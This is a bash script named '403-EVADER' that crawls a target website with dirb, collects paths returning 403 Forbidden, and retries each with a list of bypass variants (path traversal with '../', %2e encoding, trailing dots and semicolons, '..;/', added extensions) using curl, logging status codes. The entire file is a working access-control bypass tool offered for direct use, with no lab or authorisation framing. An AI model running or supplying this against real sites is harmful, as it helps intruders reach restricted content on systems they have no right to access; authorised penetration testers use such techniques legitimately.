#!/bin/bash

# Usage: ./403-EVADER.sh <target_url> <output_dir>

# Check for the required arguments
if [ $# -ne 2 ]; then
    echo "Usage: ./403-EVADER.sh <target_url> <output_dir>"
    exit 1
fi

# Set the target URL and output directory
target_url=$1
output_dir=$2

# Run dirb to discover URLs with 403 responses and save the results
dirb_result=$(dirb $target_url -o $output_dir/dirb_result.txt)

# Extract URLs with 403 responses from the dirb result
grep "403" "$output_dir/dirb_result.txt" | while IFS= read -r line; do
    url=$(echo "$line" | awk -F " " '{print $2}')  # Extract the URL from the second field
    base_url=$(dirname "$url")  # Extract the base URL
    last_segment=$(basename "$url")  # Extract the last segment
    echo "Testing potential bypass for: $last_segment"
   
    urls=(
        "$base_url/$last_segment"
        "$base_url/../$last_segment"
        "$base_url/../../$last_segment"
        "$base_url/../../../$last_segment"
        "$base_url/../../../../$last_segment"
        "$base_url/%2e/$last_segment"
        "$base_url/%2e/%2e/$last_segment"
        "$base_url/%2e/%2e/%2e/$last_segment"
        "$base_url/%2e/%2e/%2e/%2e/$last_segment"
        "$base_url/~/.$last_segment"
        "$base_url/$last_segment/."
        "$base_url/$last_segment/.."
        "$base_url/$last_segment/../."
        "$base_url/$last_segment?anything"
        "$base_url/$last_segment.html"
        "$base_url/$last_segment#"
        "$base_url/$last_segment/*"
        "$base_url/$last_segment.php"
        "$base_url/$last_segment.json"
        "$base_url/$last_segment..;/"
        "$base_url/$last_segment;/"
    )

    for test_url in "${urls[@]}"; do
        response=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$test_url")
        echo "  --> $test_url"
        echo "Response: $response"
    done
done
